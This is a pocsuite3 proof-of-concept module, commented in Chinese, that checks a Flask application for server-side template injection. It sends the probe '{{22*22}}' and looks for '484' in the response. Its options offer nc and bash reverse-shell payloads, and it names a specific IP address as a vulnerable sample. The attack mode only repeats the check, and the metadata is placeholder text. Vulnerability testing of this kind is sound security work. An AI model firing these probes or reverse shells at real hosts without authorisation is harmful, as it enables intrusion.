from collections import OrderedDict
from urllib.parse import urljoin
import re
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY

# 编写POC实现类DemoPOC，继承自POCBase类
class DemoPOC(POCBase):
    # 填写POC信息字段，需要认真填写所有基本信息字段，规范信息字段以利于查找
    vulID = '1.1'  # ssvid ID，如果是提交漏洞的同时提交POC，则写成0
    version = '1.1'  # 默认为1
    author = ['1.1']  # POC作者的名字
    vulDate = '1.1'  # 漏洞公开时间，不明确可以写今天
    createDate = '1.1'  # 编写POC的日期
    updateDate = '1.1'  # POC更新的时间，默认和编写时间一样
    references = ['flask']  # 漏洞地址来源，0day不用写
    name = 'flask'  # POC名称
    appPowerLink = 'flask'  # 漏洞厂商的地址
    appName = 'flask'  # 漏洞应用名称
    appVersion = 'flask'  # 漏洞影响版本
    vulType = VUL_TYPE.CODE_EXECUTION  # 漏洞类型
    desc = '''
    此POC用于检测Flask应用的代码执行漏洞。
    '''  # 漏洞简要描述
    samples = ['96.234.71.117:80']  # 测试样例，使用POC测试成功的网站
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        """
        定义POC的选项，提供不同的反向shell负载供选择。
        """
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    # 编写验证模式，在_verify方法中写入POC验证脚本
    def _verify(self):
        """
        验证目标是否存在漏洞。
        发送一个简单的测试负载，检查响应中是否包含预期结果。
        """
        result = {}
        path = "?name="
        url = self.url + path
        # 测试负载，用于验证代码注入漏洞
        payload = "{{22*22}}"
        try:
            resq = requests.get(url + payload)
            # 检查响应状态码和响应内容是否包含预期结果
            if resq and resq.status_code == 200 and "484" in resq.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Name'] = payload
        except Exception as e:
            logger.error(f"验证过程中出现错误: {e}")
            return
        return self.parse_output(result)

    @staticmethod
    def trim(str):
        """
        去除字符串中的空格。
        """
        return ''.join(ch for ch in str if ch != ' ')

    # 编写攻击模式，在_attack()函数中写入EXP利用脚本，在攻击模式下可以
    # 对目标进行getshell、查询管理员账户密码等操作，定义它的方法与检测模式类似
    # 若无攻击模式可以在该函数下加入return self._verify()
    def _attack(self):
        """
        执行攻击操作，尝试在目标上执行命令。
        """
        return self._verify()

    def parse_attack(self, result):
        """
        解析攻击结果，输出成功或失败信息。
        """
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        """
        预留的shell交互方法，目前未实现。
        """
        return

    def parse_output(self, result):
        """
        解析验证结果，输出成功或失败信息。
        """
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)